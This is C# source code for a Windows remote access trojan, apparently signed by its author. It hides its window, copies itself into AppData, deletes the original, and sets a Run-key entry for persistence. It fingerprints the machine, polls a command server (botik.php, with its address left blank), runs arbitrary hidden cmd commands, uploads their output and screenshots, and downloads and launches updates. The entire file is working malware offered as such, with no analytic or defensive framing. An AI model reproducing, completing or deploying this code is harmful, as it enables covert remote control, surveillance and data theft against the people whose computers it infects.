using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Management;
using Microsoft.Win32;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Leaf.xNet;

namespace love_apples
{
    internal static class Program
    {
        private static string _basePcName = "";
        private const string ServerUrl = "";
        private const string Version = "2.0";
        private const string PathRegistryKeyStartup = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private const string FileNameOnServer = "alexandria";
        private const bool Debug = true;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SwHide = 0;

        private static void Main()
        {
            while (true)
            {
                try
                {
                    ShowWindow(GetConsoleWindow(), SwHide);
                    ActProcesses();
                    
                    _basePcName = Base64Encode(GetUniqueId());
                    var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    var mainModule = Process.GetCurrentProcess().MainModule;
                    
                    if (mainModule == null) { return; }
                    
                    var mainName = mainModule.FileName;

                    if (mainName.IndexOf("Roaming", StringComparison.Ordinal) == -1 || mainModule.ModuleName == "app_updated.exe")
                    {
                        if (File.Exists(appdata + @"\app.exe")) { File.Delete(appdata + @"\app.exe"); }
                        
                        File.Copy(mainName, appdata + @"\app.exe");
                        Process.Start(appdata + @"\app.exe");
                        Process.Start( new ProcessStartInfo {
                            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath +"\"",
                            WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = "cmd.exe"
                        });
                        return;
                    }
                    
                    var requestsLol = new WebClient();
                    using (var registryKeyStartup = Registry.CurrentUser.OpenSubKey(PathRegistryKeyStartup, true)) {
                        if (registryKeyStartup == null) return;
                        registryKeyStartup.SetValue(mainName, $"\"{System.Reflection.Assembly.GetExecutingAssembly().Location}\"");
                    }
                    
                    var respUrlCheck = requestsLol.DownloadString($"{ServerUrl}botik.php?pcKey={_basePcName}&ver={Version}");
                    switch (respUrlCheck)
                    {
                        case "": {
                            requestsLol.DownloadString($"{ServerUrl}botik.php?pcKey={_basePcName}&tgMes=<b>Один из ПК прослушивает...</b>&ver={Version}");
                            break;
                        }

                        case "update": {
                            requestsLol.DownloadFile($"{ServerUrl}update/{FileNameOnServer}.exe", appdata + @"\app_updated.exe");
                            Process.Start(appdata + @"\app_updated.exe");
                            break;
                        }
                    }
                    
                    GetCommands();
                    break;

                } 
                catch (Exception ex)
                {
                    if (Debug) File.WriteAllText("log.txt",ex.ToString());
                }
            }


        }

        private static string Base64Encode(string plainText) { 
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes); 
        }

        private static void ActProcesses() {
            var procList = Process.GetProcesses();
            foreach (var process in procList)
            {
                if (process.Id == Process.GetCurrentProcess().Id) continue;
                        
                if (process.ProcessName == "alexandria" || process.ProcessName == "app") {
                    process.Kill();
                }
            }
        }

        private static string GetUniqueId()
        {
            var cpuInfo = string.Empty;
            var mc = new ManagementClass("win32_processor");
            var moc = mc.GetInstances();

            foreach (var mo in moc) {
                cpuInfo = mo.Properties["processorID"].Value.ToString();
                break;
            }
            const string drive = "C";
            var dsk = new ManagementObject(@"win32_logicaldisk.deviceid=""" + drive + @":""");
            dsk.Get();
            var volumeSerial = dsk["VolumeSerialNumber"].ToString();
            var pcName = Environment.MachineName;
            var uniqueId = cpuInfo + volumeSerial + pcName;

            return uniqueId;
        }
        
        private static void GetCommands()
        {
            while (true)
            {
                var requestsLol = new WebClient();
                var strCommands = requestsLol.DownloadString($"{ServerUrl}/botik.php?pcKey={_basePcName}&getCommands=1&ver={Version}");
                var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                
                switch (strCommands)
                {
                    case "true":
                    {
                        Process.Start( new ProcessStartInfo {
                            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                            WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = "cmd.exe"
                        });
                        return;
                    }
                    case "update": {
                        requestsLol.DownloadFile($"{ServerUrl}update/{FileNameOnServer}.exe", appdata + @"\app_updated.exe");
                        Process.Start("\app_updated.exe");
                        break;
                    }
                    case "":
                        continue; 
                }
                
                
                var allCommands = strCommands.Split('\n');
                foreach (var command in allCommands)
                {
                    if (command == ""){ continue; }
                    var words = command.Split('*');
                    
                    var inAct = words[0];
                    var commandAct = words[1];
                    
                    switch (inAct)
                    {
                        case "cmd":
                        {
                            var psiOpt = new ProcessStartInfo(@"cmd.exe", commandAct)
                            {
                                WindowStyle = ProcessWindowStyle.Hidden,
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };
                            var procCommand = Process.Start(psiOpt);
                            if (procCommand == null) continue;
                            var srIncoming = procCommand.StandardOutput;
                            var respCmd = srIncoming.ReadToEnd();
                            if (respCmd.Length >= 500)
                            {
                                File.WriteAllText("cmd.txt", respCmd, encoding: Encoding.UTF8);
                                using (var request = new HttpRequest())
                                {
                                    var multipartContent = new MultipartContent {
                                        {new StringContent($"{_basePcName}"), "pcKey"},
                                        {new StringContent("1"), "getDocument"},
                                        {new FileContent("cmd.txt"), "document", "cmd.txt"}
                                    };
                                    request.Post($"{ServerUrl}botik.php", multipartContent);
                                }

                                File.Delete("cmd.txt");
                            }
                            else
                            {
                                requestsLol.DownloadString(
                                    $"{ServerUrl}botik.php?pcKey={_basePcName}&tg<b>Mes=Команда выполнена.</b>");
                            }

                            procCommand.WaitForExit();
                            break;
                        }

                        case "screenshot":
                        {
                            var bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                Screen.PrimaryScreen.Bounds.Height);
                            Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                            bitmap.Save("screen.png");
                            using (var request = new HttpRequest())
                            {
                                var multipartContent = new MultipartContent()
                                {
                                    {new StringContent($"{_basePcName}"), "pcKey"},
                                    {new StringContent("1"), "getScreenshot"},
                                    {new FileContent("screen.png"), "document", "screen.png"}
                                };
                                request.Post($"{ServerUrl}botik.php", multipartContent);
                            }

                            File.Delete("screen.png");
                            break;
                        }

                        case "message":
                        {
                            var bytes = Encoding.Default.GetBytes(commandAct);
                            commandAct = Encoding.UTF8.GetString(bytes);
                            var splitMessage = commandAct.Split('|');
                            var titleMessageBox = splitMessage[0];
                            var message = splitMessage[1];
                            MessageBox.Show(message, titleMessageBox);
                            break;
                        }
                    }
                }
            }
        }
    }
}


// #coded by @loveappless